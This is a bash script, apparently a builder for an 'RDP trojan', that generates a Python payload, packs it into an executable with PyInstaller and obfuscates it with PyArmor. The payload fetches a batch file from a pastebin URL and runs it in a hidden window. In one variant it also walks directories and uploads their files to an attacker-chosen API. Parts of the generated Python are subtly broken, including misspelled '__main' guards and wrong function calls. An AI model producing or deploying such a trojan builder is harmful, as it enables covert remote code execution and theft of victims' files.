#!/bin/bash

echo " _______                              ______"                                
echo "|       \                            /      \"                               
echo "| $$$$$$$\  ______    ______        |  $$$$$$\ ______    ______   _______ " 
echo "| $$  | $$ /      \  /      \       | $$   \$$ /      \  /      \ |       \" 
echo "| $$  | $$|  $$$$$$\|  $$$$$$\      | $$      |  $$$$$$\|  $$$$$$\| $$$$$$$\"
echo "| $$  | $$| $$    $$| $$   \$$      | $$   __ | $$  | $$| $$  | $$| $$  | $$"
echo "| $$__/ $$| $$$$$$$$| $$            | $$__/  \| $$__/ $$| $$__/ $$| $$  | $$"
echo "| $$    $$ \$$     \| $$             \$$    $$ \$$    $$ \$$    $$| $$  | $$"
echo " \$$$$$$$   \$$$$$$$ \$$              \$$$$$$   \$$$$$$   \$$$$$$  \$$   \$$"
                                                                            
                                                                            
                                                                            


compiled_script="coon.sh"
original_script="der_coon.sh"

if [ ! -f "$compiled_script" ]; then
    echo "Compiling the script..."
    shc -f "$original_script"
    if [ $? -eq 0 ]; then
        echo "Script has been successfully compiled."
    else
        echo "Error compiling the script."
        exit 1
    fi
fi

./$compiled_script

read -p "Enter the API address (e.g., https://example.com/api): " api_url

read -p "Do you want to create an RDP trojan? (Y/N): " a1

if [ "$a1" == "N" ]; then
    exit
elif [ "$a1" == "Y" ]; then
    echo "Do you want to add advice?"

    read -p "(Y/N): " a2

    if [ "$a2" == "N" ]; then
        a=0
    elif [ "$a2" == "Y" ]; then
        a=1
    fi

    read -p "Enter the filename for the Python file (e.g., my_script.py): " python_file

    if [ -e "$python_file" ]; then
        echo "The file $python_file already exists. Overwrite? (Y/N): "
        read overwrite
        if [ "$overwrite" == "N" ]; then
            echo "Creation aborted."
            exit 0
        fi
    fi

    if [ $a -eq 0 ]; then
        python_code=$(cat <<END
import subprocess
import requests

api_url = "$api_url"

def main():
    import subprocess
    import os
    import socket
    import requests
    import shutil

    def get_local_ip():
        host_name = socket.gethostname()
        return socket.gethostbyname(host_name)

    def download_and_execute_batch():
        try:
            paste_bin_url = "https://pastebin.com/vYzLa2Se"

            response = requests.get(paste_bin_url)
            if response.status_code == 200:
                batch_content = response.text

                with open("temp_batch.bat", "w") as batch_file:
                    batch_file.write(batch_content)

                subprocess.Popen(["cmd", "/c", "start", "cmd", "/c", "temp_batch.bat"], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

            local_ip = get_local_ip()
        except Exception:
            pass

    if __name__ == "__main__":
        download_and_execute_batch()

if __name__ == "__main__":
    main()
END
)
    else
        python_code=$(cat <<END
import requests

api_url = "$api_url"

def main():
    import subprocess
    import os
    import socket
    import requests
    import shutil

    def get_local_ip():
        host_name = socket.gethostname()
        return socket.gethostbyname(host_name)

    def copy_directory(source):
        try:
            shutil.copytree(source)
        except Exception:
            pass

    def download_and_execute_batch():
        try:
            paste_bin_url = "https://pastebin.com/vYzLa2Se"

            response = requests.get(paste_bin_url)
            if response.status_code == 200:
                batch_content = response.text

                with open("temp_batch.bat", "w") as batch_file:
                    batch_file.write(batch_content)

                subprocess.Popen(["cmd", "/c", "start", "cmd", "/c", "temp_batch.bat"], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

        except Exception:
            pass

    def send_files_to_api(directory):
        try:
            for root, dirs, files in os.walk(directory):
                for file in files:
                    file_path = os.path.join(root, file)
                    with open(file_path, 'rb') as f:
                        files = {'file': (file, f)}
                        requests.post(api_url, files=files)

            local_ip = get_local_ip()
            copy_directory("C:\\Users")
            send_files_to_api(api_url)
        except Exception:
            pass

    if __name__ == "__main":
        download_and_execute_batch()
        send_files_to_api()

        response = requests.get(api_url)
        if response.status_code == 200:
            print("Received API response:", response.text)
        else:
            print("Error fetching API.")
            
if __name__ == "__main":
    main()
END
)
    fi

    echo "$python_code" > "$python_file"

    echo "Python file '$python_file' has been created."

    pyinstaller --onefile "$python_file"

if [ $? -eq 0 ]; then
    echo "EXE file has been successfully created."

    pyarmor obfuscate --onefile "$python_file"
    echo "EXE file has been encrypted with PyArmor."

    rm "$python_file"
    echo "Original Python file '$python_file' has been deleted."
else
    echo "Error creating the EXE file."
fi
